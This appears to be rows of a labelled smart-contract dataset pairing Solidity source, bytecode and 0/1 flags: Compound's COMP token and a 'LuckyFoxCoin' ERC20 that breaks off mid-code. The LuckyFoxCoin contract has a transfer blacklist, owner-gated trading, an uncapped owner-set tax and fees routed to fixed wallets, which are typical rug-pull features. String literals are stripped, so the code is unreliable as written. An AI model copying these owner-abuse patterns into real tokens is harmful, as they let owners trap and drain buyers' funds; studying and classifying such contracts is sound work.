1906001600160a01b031690816001600160a01b031681525050611fc6307f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d846112df565b60405163791ac94760e01b81526001600160a01b037f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d169063791ac9479061201b908590600090869030904290600401612526565b600060405180830381600087803b15801561203557600080fd5b505af1158015610c5a573d6000803e3d6000fd5b612074307f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d846112df565b60405163f305d71960e01b815230600482015260248101839052600060448201819052606482015261dead60848201524260a48201527f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b03169063f305d71990839060c4016060604051808303818588803b1580156120f957600080fd5b505af115801561210d573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906121329190612597565b5050505050565b6000818361215a5760405162461bcd60e51b81526004016109c99190612167565b506000611a3e8486612432565b600060208083528351808285015260005b8181101561219457858101830151858201604001528201612178565b818111156121a6576000604083870101525b50601f01601f1916929092016040019392505050565b6001600160a01b03811681146121d157600080fd5b50565b600080604083850312156121e757600080fd5b82356121f2816121bc565b946020939093013593505050565b60006020828403121561221257600080fd5b81356112d8816121bc565b60008060006060848603121561223257600080fd5b833561223d816121bc565b9250602084013561224d816121bc565b929592945050506040919091013590565b8035801515811461118957600080fd5b6000806040838503121561228157600080fd5b823561228c816121bc565b915061229a6020840161225e565b90509250929050565b6000602082840312156122b557600080fd5b6112d88261225e565b60008060008060008060c087890312156122d757600080fd5b505084359660208601359650604086013595606081013595506080810135945060a0013592509050565b6000806040838503121561231457600080fd5b50508035926020909101359150565b60006020828403121561233557600080fd5b5035919050565b6000806040838503121561234f57600080fd5b823561235a816121bc565b9150602083013561236a816121bc565b809150509250929050565b600181811c9082168061238957607f821691505b602082108114156123aa57634e487b7160e01b600052602260045260246000fd5b50919050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052601160045260246000fd5b6000821982111561240e5761240e6123e5565b500190565b600081600019048311821515161561242d5761242d6123e5565b500290565b60008261244f57634e487b7160e01b600052601260045260246000fd5b500490565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b6000828210156124ee576124ee6123e5565b500390565b634e487b7160e01b600052603260045260246000fd5b60006020828403121561251b57600080fd5b81516112d8816121bc565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b818110156125765784516001600160a01b031683529383019391830191600101612551565b50506001600160a01b03969096166060850152505050608001529392505050565b6000806000606084860312156125ac57600080fd5b835192506020840151915060408401519050925092509256fe45524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa26469706673582212206a281ecf8c96a2df63108581cdbde161675f45af03a176de7076b3049751e4c564736f6c63430008090033,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,0,0
"pragma solidity ^0.5.16; pragma experimental ABIEncoderV2; contract Comp { /// @notice EIP-20 token name for this token string public constant name = ; /// @notice EIP-20 token symbol for this token string public constant symbol = ; /// @notice EIP-20 token decimals for this token uint8 public constant decimals = 18; /// @notice Total number of tokens in circulation uint public constant totalSupply = 10000000e18; // 10 million Comp /// @notice Allowance amounts on behalf of others mapping (address => mapping (address => uint96)) internal allowances; /// @notice Official record of token balances for each account mapping (address => uint96) internal balances; /// @notice A record of each accounts delegate mapping (address => address) public delegates; /// @notice A checkpoint for marking number of votes from a given block struct Checkpoint { uint32 fromBlock; uint96 votes; } /// @notice A record of votes checkpoints for each account, by index mapping (address => mapping (uint32 => Checkpoint)) public checkpoints; /// @notice The number of checkpoints for each account mapping (address => uint32) public numCheckpoints; /// @notice The EIP-712 typehash for the contract's domain bytes32 public constant DOMAIN_TYPEHASH = keccak256(); /// @notice The EIP-712 typehash for the delegation struct used by the contract bytes32 public constant DELEGATION_TYPEHASH = keccak256(); /// @notice A record of states for signing / validating signatures mapping (address => uint) public nonces; /// @notice An event thats emitted when an account changes its delegate event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate); /// @notice An event thats emitted when a delegate account's vote balance changes event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance); /// @notice The standard EIP-20 transfer event event Transfer(address indexed from, address indexed to, uint256 amount); /// @notice The standard EIP-20 approval event event Approval(address indexed owner, address indexed spender, uint256 amount); constructor(address account) public { balances[account] = uint96(totalSupply); emit Transfer(address(0), account, totalSupply); } function allowance(address account, address spender) external view returns (uint) { return allowances[account][spender]; } function approve(address spender, uint rawAmount) external returns (bool) { uint96 amount; if (rawAmount == uint(-1)) { amount = uint96(-1); } else { amount = safe96(rawAmount, ); } allowances[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; } function balanceOf(address account) external view returns (uint) { return balances[account]; } function transfer(address dst, uint rawAmount) external returns (bool) { uint96 amount = safe96(rawAmount, ); _transferTokens(msg.sender, dst, amount); return true; } function transferFrom(address src, address dst, uint rawAmount) external returns (bool) { address spender = msg.sender; uint96 spenderAllowance = allowances[src][spender]; uint96 amount = safe96(rawAmount, ); if (spender != src && spenderAllowance != uint96(-1)) { uint96 newAllowance = sub96(spenderAllowance, amount, ); allowances[src][spender] = newAllowance; emit Approval(src, spender, newAllowance); } _transferTokens(src, dst, amount); return true; } function delegate(address delegatee) public { return _delegate(msg.sender, delegatee); } function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) public { bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this))); bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry)); bytes32 digest = keccak256(abi.encodePacked(, domainSeparator, structHash)); address signatory = ecrecover(digest, v, r, s); require(signatory != address(0), ); require(nonce == nonces[signatory]++, ); require(now <= expiry, ); return _delegate(signatory, delegatee); } function getCurrentVotes(address account) external view returns (uint96) { uint32 nCheckpoints = numCheckpoints[account]; return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0; } function getPriorVotes(address account, uint blockNumber) public view returns (uint96) { require(blockNumber < block.number, ); uint32 nCheckpoints = numCheckpoints[account]; if (nCheckpoints == 0) { return 0; } // First check most recent balance if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) { return checkpoints[account][nCheckpoints - 1].votes; } // Next check implicit zero balance if (checkpoints[account][0].fromBlock > blockNumber) { return 0; } uint32 lower = 0; uint32 upper = nCheckpoints - 1; while (upper > lower) { uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow Checkpoint memory cp = checkpoints[account][center]; if (cp.fromBlock == blockNumber) { return cp.votes; } else if (cp.fromBlock < blockNumber) { lower = center; } else { upper = center - 1; } } return checkpoints[account][lower].votes; } function _delegate(address delegator, address delegatee) internal { address currentDelegate = delegates[delegator]; uint96 delegatorBalance = balances[delegator]; delegates[delegator] = delegatee; emit DelegateChanged(delegator, currentDelegate, delegatee); _moveDelegates(currentDelegate, delegatee, delegatorBalance); } function _transferTokens(address src, address dst, uint96 amount) internal { require(src != address(0), ); require(dst != address(0), ); balances[src] = sub96(balances[src], amount, ); balances[dst] = add96(balances[dst], amount, ); emit Transfer(src, dst, amount); _moveDelegates(delegates[src], delegates[dst], amount); } function _moveDelegates(address srcRep, address dstRep, uint96 amount) internal { if (srcRep != dstRep && amount > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0; uint96 srcRepNew = sub96(srcRepOld, amount, ); _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew); } if (dstRep != address(0)) { uint32 dstRepNum = numCheckpoints[dstRep]; uint96 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0; uint96 dstRepNew = add96(dstRepOld, amount, ); _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew); } } } function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint96 oldVotes, uint96 newVotes) internal { uint32 blockNumber = safe32(block.number, ); if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) { checkpoints[delegatee][nCheckpoints - 1].votes = newVotes; } else { checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes); numCheckpoints[delegatee] = nCheckpoints + 1; } emit DelegateVotesChanged(delegatee, oldVotes, newVotes); } function safe32(uint n, string memory errorMessage) internal pure returns (uint32) { require(n < 2**32, errorMessage); return uint32(n); } function safe96(uint n, string memory errorMessage) internal pure returns (uint96) { require(n < 2**96, errorMessage); return uint96(n); } function add96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) { uint96 c = a + b; require(c >= a, errorMessage); return c; } function sub96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) { require(b <= a, errorMessage); return a - b; } function getChainId() internal pure returns (uint) { uint256 chainId; assembly { chainId := chainid() } return chainId; } } ",0x608060405234801561001057600080fd5b50600436106101215760003560e01c806370a08231116100ad578063b4b5ea5711610071578063b4b5ea571461025f578063c3cda52014610272578063dd62ed3e14610285578063e7a324dc14610298578063f1127ed8146102a057610121565b806370a08231146101fe578063782d6fe1146102115780637ecebe001461023157806395d89b4114610244578063a9059cbb1461024c57610121565b806323b872dd116100f457806323b872dd14610181578063313ce56714610194578063587cde1e146101a95780635c19a95c146101c95780636fcfff45146101de57610121565b806306fdde0314610126578063095ea7b31461014457806318160ddd1461016457806320606b7014610179575b600080fd5b61012e6102c1565b60405161013b919061173c565b60405180910390f35b610157610152366004611205565b6102e5565b60405161013b9190611692565b61016c6103a2565b60405161013b91906116a0565b61016c6103b1565b61015761018f3660046111b8565b6103c8565b61019c61050d565b60405161013b91906117d6565b6101bc6101b7366004611158565b610512565b60405161013b9190611684565b6101dc6101d7366004611158565b61052d565b005b6101f16101ec366004611158565b61053a565b60405161013b91906117ad565b61016c61020c366004611158565b610552565b61022461021f366004611205565b610576565b60405161013b91906117f2565b61016c61023f366004611158565b61078d565b61012e61079f565b61015761025a366004611205565b6107bf565b61022461026d366004611158565b6107fb565b6101dc610280366004611235565b61086b565b61016c61029336600461117e565b610a55565b61016c610a87565b6102b36102ae3660046112bc565b610a93565b60405161013b9291906117bb565b6040518060400160405280600881526020016710dbdb5c1bdd5b9960c21b81525081565b6000806000198314156102fb5750600019610320565b61031d8360405180606001604052806025815260200161190e60259139610ac8565b90505b336000818152602081815260408083206001600160a01b03891680855292529182902080546001600160601b0319166001600160601b03861617905590519091907f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259061038e9085906117e4565b60405180910390a360019150505b92915050565b6a084595161401484a00000081565b6040516103bd9061166e565b604051809103902081565b6001600160a01b0383166000908152602081815260408083203380855290835281842054825160608101909352602580845291936001600160601b0390911692859261041e928892919061190e90830139610ac8565b9050866001600160a01b0316836001600160a01b03161415801561044b57506001600160601b0382811614155b156104f357600061047583836040518060600160405280603d81526020016119e5603d9139610af7565b6001600160a01b03898116600081815260208181526040808320948a16808452949091529081902080546001600160601b0319166001600160601b0386161790555192935090917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906104e99085906117e4565b60405180910390a3505b6104fe878783610b36565b600193505050505b9392505050565b601281565b6002602052600090815260409020546001600160a01b031681565b6105373382610ce1565b50565b60046020526000908152604090205463ffffffff1681565b6001600160a01b03166000908152600160205260409020546001600160601b031690565b60004382106105a05760405162461bcd60e51b81526004016105979061176d565b60405180910390fd5b6001600160a01b03831660009081526004602052604090205463ffffffff16806105ce57600091505061039c565b6001600160a01b038416600090815260036020908152604080832063ffffffff60001986018116855292529091205416831061064a576001600160a01b03841660009081526003602090815260408083206000199490940163ffffffff1683529290522054600160201b90046001600160601b0316905061039c565b6001600160a01b038416600090815260036020908152604080832083805290915290205463ffffffff1683101561068557600091505061039c565b600060001982015b8163ffffffff168163ffffffff16111561074857600282820363ffffffff160481036106b7611115565b506001600160a01b038716600090815260036020908152604080832063ffffffff858116855290835292819020815180830190925254928316808252600160201b9093046001600160601b031691810191909152908714156107235760200151945061039c9350505050565b805163ffffffff1687111561073a57819350610741565b6001820392505b505061068d565b506001600160a01b038516600090815260036020908152604080832063ffffffff909416835292905220546001600160601b03600160201b9091041691505092915050565b60056020526000908152604090205481565b604051806040016040528060048152602001630434f4d560e41b81525081565b6000806107e48360405180606001604052806026815260200161193360269139610ac8565b90506107f1338583610b36565b5060019392505050565b6001600160a01b03811660009081526004602052604081205463ffffffff1680610826576000610506565b6001600160a01b0383166000908152600360209081526040808320600019850163ffffffff168452909152902054600160201b90046001600160601b03169392505050565b60006040516108799061166e565b60408051918290038220828201909152600882526710dbdb5c1bdd5b9960c21b6020909201919091527f561ca898cce9f021c15a441ef41899706e923541cee724530075d1a1144761c76108cb610d6b565b306040516020016108df94939291906116ec565b604051602081830303815290604052805190602001209050600060405161090590611679565b604051908190038120610920918a908a908a906020016116ae565b6040516020818303038152906040528051906020012090506000828260405160200161094d92919061163d565b60405160208183030381529060405280519060200120905060006001828888886040516000815260200160405260405161098a9493929190611721565b6020604051602081039080840390855afa1580156109ac573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b0381166109df5760405162461bcd60e51b81526004016105979061174d565b6001600160a01b03811660009081526005602052604090208054600181019091558914610a1e5760405162461bcd60e51b81526004016105979061177d565b87421115610a3e5760405162461bcd60e51b81526004016105979061175d565b610a48818b610ce1565b505050505b505050505050565b6001600160a01b039182166000908152602081815260408083209390941682529190915220546001600160601b031690565b6040516103bd90611679565b600360209081526000928352604080842090915290825290205463ffffffff811690600160201b90046001600160601b031682565b600081600160601b8410610aef5760405162461bcd60e51b8152600401610597919061173c565b509192915050565b6000836001600160601b0316836001600160601b031611158290610b2e5760405162461bcd60e51b8152600401610597919061173c565b505050900390565b6001600160a01b038316610b5c5760405162461bcd60e51b81526004016105979061179d565b6001600160a01b038216610b825760405162461bcd60e51b81526004016105979061178d565b6001600160a01b038316600090815260016020908152604091829020548251606081019093526036808452610bcd936001600160601b0390921692859291906118d890830139610af7565b6001600160a01b03848116600090815260016020908152604080832080546001600160601b0319166001600160601b03968716179055928616825290829020548251606081019093526030808452610c3594919091169285929091906119b590830139610d6f565b6001600160a01b038381166000818152600160205260409081902080546001600160601b0319166001600160601b0395909516949094179093559151908516907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90610ca29085906117e4565b60405180910390a36001600160a01b03808416600090815260026020526040808220548584168352912054610cdc92918216911683610dab565b505050565b6001600160a01b03808316600081815260026020818152604080842080546001845282862054949093528787166001600160a01b031984168117909155905191909516946001600160601b039092169391928592917f3134e8a2e6d97e929a7e54011ea5485d7d196dd5f0ba4d4ef95803e8e3fc257f9190a4610d65828483610dab565b50505050565b4690565b6000838301826001600160601b038087169083161015610da25760405162461bcd60e51b8152600401610597919061173c565b50949350505050565b816001600160a01b0316836001600160a01b031614158015610dd657506000816001600160601b0316115b15610cdc576001600160a01b03831615610e8e576001600160a01b03831660009081526004602052604081205463ffffffff169081610e16576000610e55565b6001600160a01b0385166000908152600360209081526040808320600019860163ffffffff168452909152902054600160201b90046001600160601b03165b90506000610e7c828560405180606001604052806028815260200161198d60289139610af7565b9050610e8a86848484610f39565b5050505b6001600160a01b03821615610cdc576001600160a01b03821660009081526004602052604081205463ffffffff169081610ec9576000610f08565b6001600160a01b0384166000908152600360209081526040808320600019860163ffffffff168452909152902054600160201b90046001600160601b03165b90506000610f2f8285604051806060016040528060278152602001611a2260279139610d6f565b9050610a4d858484845b6000610f5d43604051806060016040528060348152602001611959603491396110ee565b905060008463ffffffff16118015610fa657506001600160a01b038516600090815260036020908152604080832063ffffffff6000198901811685529252909120548282169116145b15611005576001600160a01b0385166000908152600360209081526040808320600019880163ffffffff168452909152902080546fffffffffffffffffffffffff000000001916600160201b6001600160601b038516021790556110a4565b60408051808201825263ffffffff80841682526001600160601b0380861660208085019182526001600160a01b038b166000818152600383528781208c871682528352878120965187549451909516600160201b026fffffffffffffffffffffffff000000001995871663ffffffff19958616179590951694909417909555938252600490935292909220805460018801909316929091169190911790555b846001600160a01b03167fdec2bacdd2f05b59de34da9b523dff8be42e5e38e818c82fdb0bae774387a72484846040516110df929190611800565b60405180910390a25050505050565b600081600160201b8410610aef5760405162461bcd60e51b8152600401610597919061173c565b604080518082019091526000808252602082015290565b803561039c816118a8565b803561039c816118bc565b803561039c816118c5565b803561039c816118ce565b60006020828403121561116a57600080fd5b6000611176848461112c565b949350505050565b6000806040838503121561119157600080fd5b600061119d858561112c565b92505060206111ae8582860161112c565b9150509250929050565b6000806000606084860312156111cd57600080fd5b60006111d9868661112c565b93505060206111ea8682870161112c565b92505060406111fb86828701611137565b9150509250925092565b6000806040838503121561121857600080fd5b6000611224858561112c565b92505060206111ae85828601611137565b60008060008060008060c0878903121561124e57600080fd5b600061125a898961112c565b965050602061126b89828a01611137565b955050604061127c89828a01611137565b945050606061128d89828a0161114d565b935050608061129e89828a01611137565b92505060a06112af89828a01611137565b9150509295509295509295565b600080604083850312156112cf57600080fd5b60006112db858561112c565b92505060206111ae85828601611142565b6112f58161182d565b82525050565b6112f581611838565b6112f58161183d565b6112f56113198261183d565b61183d565b60006113298261181b565b611333818561181f565b9350611343818560208601611872565b61134c8161189e565b9093019392505050565b600061136360268361181f565b7f436f6d703a3a64656c656761746542795369673a20696e76616c6964207369678152656e617475726560d01b602082015260400192915050565b60006113ab60268361181f565b7f436f6d703a3a64656c656761746542795369673a207369676e617475726520658152651e1c1a5c995960d21b602082015260400192915050565b60006113f3600283611828565b61190160f01b815260020192915050565b600061141160278361181f565b7f436f6d703a3a6765745072696f72566f7465733a206e6f742079657420646574815266195c9b5a5b995960ca1b602082015260400192915050565b600061145a60228361181f565b7f436f6d703a3a64656c656761746542795369673a20696e76616c6964206e6f6e815261636560f01b602082015260400192915050565b600061149e603a8361181f565b7f436f6d703a3a5f7472616e73666572546f6b656e733a2063616e6e6f7420747281527f616e7366657220746f20746865207a65726f2061646472657373000000000000602082015260400192915050565b60006114fd604383611828565b7f454950373132446f6d61696e28737472696e67206e616d652c75696e7432353681527f20636861696e49642c6164647265737320766572696679696e67436f6e74726160208201526263742960e81b604082015260430192915050565b6000611568603c8361181f565b7f436f6d703a3a5f7472616e73666572546f6b656e733a2063616e6e6f7420747281527f616e736665722066726f6d20746865207a65726f206164647265737300000000602082015260400192915050565b60006115c7603a83611828565b7f44656c65676174696f6e28616464726573732064656c6567617465652c75696e81527f74323536206e6f6e63652c75696e7432353620657870697279290000000000006020820152603a0192915050565b6112f58161184c565b6112f581611855565b6112f581611867565b6112f58161185b565b6000611648826113e6565b9150611654828561130d565b602082019150611664828461130d565b5060200192915050565b600061039c826114f0565b600061039c826115ba565b6020810161039c82846112ec565b6020810161039c82846112fb565b6020810161039c8284611304565b608081016116bc8287611304565b6116c960208301866112ec565b6116d66040830185611304565b6116e36060830184611304565b95945050505050565b608081016116fa8287611304565b6117076020830186611304565b6117146040830185611304565b6116e360608301846112ec565b6080810161172f8287611304565b6116c96020830186611622565b60208082528101610506818461131e565b6020808252810161039c81611356565b6020808252810161039c8161139e565b6020808252810161039c81611404565b6020808252810161039c8161144d565b6020808252810161039c81611491565b6020808252810161039c8161155b565b6020810161039c8284611619565b604081016117c98285611619565b6105066020830184611634565b6020810161039c8284611622565b6020810161039c828461162b565b6020810161039c8284611634565b6040810161180e828561162b565b610506602083018461162b565b5190565b90815260200190565b919050565b600061039c82611840565b151590565b90565b6001600160a01b031690565b63ffffffff1690565b60ff1690565b6001600160601b031690565b600061039c8261185b565b60005b8381101561188d578181015183820152602001611875565b83811115610d655750506000910152565b601f01601f191690565b6118b18161182d565b811461053757600080fd5b6118b18161183d565b6118b18161184c565b6118b18161185556fe436f6d703a3a5f7472616e73666572546f6b656e733a207472616e7366657220616d6f756e7420657863656564732062616c616e6365436f6d703a3a617070726f76653a20616d6f756e7420657863656564732039362062697473436f6d703a3a7472616e736665723a20616d6f756e7420657863656564732039362062697473436f6d703a3a5f7772697465436865636b706f696e743a20626c6f636b206e756d62657220657863656564732033322062697473436f6d703a3a5f6d6f7665566f7465733a20766f746520616d6f756e7420756e646572666c6f7773436f6d703a3a5f7472616e73666572546f6b656e733a207472616e7366657220616d6f756e74206f766572666c6f7773436f6d703a3a7472616e7366657246726f6d3a207472616e7366657220616d6f756e742065786365656473207370656e64657220616c6c6f77616e6365436f6d703a3a5f6d6f7665566f7465733a20766f746520616d6f756e74206f766572666c6f7773a365627a7a723158206589d4ace0383947c7f0391417a2336732243d255d673f763411bc1dfffc84c96c6578706572696d656e74616cf564736f6c63430005100040,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity 0.8.17;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }}contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }}interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);}contract LuckyFoxCoin is Context, IERC20, Ownable { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; mapping (address => bool) private _isExcludedFromFee; mapping (address => bool) private bots; address payable private _taxWallet1; address payable private _taxWallet2; address payable private _taxWallet3; uint256 private _initialTax = 5; uint256 private _reduceTaxCountdown = 0; uint256 private _finalTax = 5; uint256 private _preventSwapBefore = 0; uint8 private constant _decimals = 10; uint256 private constant _tTotal = 10_000_000 * 10**_decimals; string private constant _name = ; string private constant _symbol = ; uint256 public _maxTxAmount = 200_000 * 10**_decimals; uint256 public _maxWalletSize = 200_000 * 10**_decimals; uint256 public _taxSwap = 98_500 * 10**_decimals; IUniswapV2Router02 private uniswapV2Router; address private uniswapV2Pair; bool private tradingOpen; bool private inSwap = false; bool private swapEnabled = false; bool public tradingEnabled = false; event TradingEnabled(); event MaxTxAmountUpdated(uint _maxTxAmount); modifier lockTheSwap { inSwap = true; _; inSwap = false; } modifier isTradingOpen() { require(tradingOpen, ); _; } modifier tradingAllowed() { require(tradingEnabled || msg.sender == owner() || msg.sender == address(uniswapV2Router) || msg.sender == address(this), ); _; } constructor () { _taxWallet1 = payable(0xEc160748A76633a7Fa95F2FC261f9EC696D98EE7); _taxWallet2 = payable(0x1cBeF036a46b18A3A48e5912AB1A0F944719c5CC); _taxWallet3 = payable(0x5240057b2F23765b7b3Af7d77027A39Dcd91f007); _balances[_msgSender()] = _tTotal; _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_taxWallet1] = true; _isExcludedFromFee[_taxWallet2] = true; _isExcludedFromFee[_taxWallet3] = true; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public pure returns (string memory) { return _name; } function symbol() public pure returns (string memory) { return _symbol; } function decimals() public pure returns (uint8) { return _decimals; } function totalSupply() public pure override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override tradingAllowed returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function setFinalTaxFeePercent(uint256 taxFee) external onlyOwner() { _finalTax = taxFee; } function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() { _maxTxAmount = _tTotal.mul(maxTxPercent).div( 10**2 ); emit MaxTxAmountUpdated(_maxTxAmount); } function setMaxWalletPercent(uint256 maxWalletPercent) external onlyOwner() { _maxWalletSize = _tTotal.mul(maxWalletPercent).div( 10**2 ); } function setTaxWallet1(address taxWallet1) external onlyOwner() { _taxWallet1 = payable(taxWallet1); } function setTaxWallet2(address taxWallet2) external onlyOwner() { _taxWallet2 = payable(taxWallet2); } function setTaxWallet3(address taxWallet3) external onlyOwner() { _taxWallet3 = payable(taxWallet3); } function setTaxSwap(uint256 taxSwap) external onlyOwner() { _taxSwap = taxSwap; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override tradingAllowed returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function _approve(address owner, address spender, uint256 amount) private { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer(address from, address to, uint256 amount) private { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); uint256 taxAmount=0; if (from != owner() && to != owner()) { require(!bots[from] && !bots[to]); taxAmount = amount.mul((_reduceTaxCountdown==0)?_finalTax:_initialTax).div(100); if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) { require(amount <= _maxTxAmount, ); require(balanceOf(to) + amount <= _maxWalletSize, ); if(_reduceTaxCountdown>0){_reduceTaxCountdown--;} } uint256 contractTokenBalance = balanceOf(address(this)); if (!inSwap && from != uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwap && _reduceTaxCountdown<=_preventSwapBefore) { swapTokensForEth(_taxSwap); uint256 contractETHBalance = address(this).balance; if(contractETHBalance > 0) { sendETHToFee(address(this).balance); } } } _balances[from]=_balances[from].sub(amount); _balances[to]=_balances[to].add(amount.sub(taxAmount)); emit Transfer(from, to, amount.sub(taxAmount)); if(taxAmount>0){ _balances[address(this)]=_balances[address(this)].add(taxAmount); emit Transfer(from, address(this),taxAmount); } } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function removeLimits() external onlyOwner{ _maxTxAmount = _tTotal; _maxWalletSize = _tTotal; emit MaxTxAmountUpdated(_tTotal); } function sendETHToFee(uint256 amount) private { _taxWallet1.transfer(amount.mul(5).div(100)); _taxWallet2.transfer(amount.mul(10).div(100)); _taxWallet3.transfer(amount.mul(85).div(100)); } function openTrading() external onlyOwner() { require(!tradingOpen,); uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); _approve(address(this), address(uniswapV2Router), _tTotal); uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp); swapEnabled = true; tradingOpen = false; IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); } function getUniswapV2Pair() public view returns (address) { return uniswapV2Pair; } function enableTrading() public onlyOwner { tradingEnabled = true; emit TradingEnabled(); } receive() external payable {} function manualswap() external { swapTokensForEth(balanceOf(address(this))); } function manualsend() external { sendETHToFee(address(this).balance); 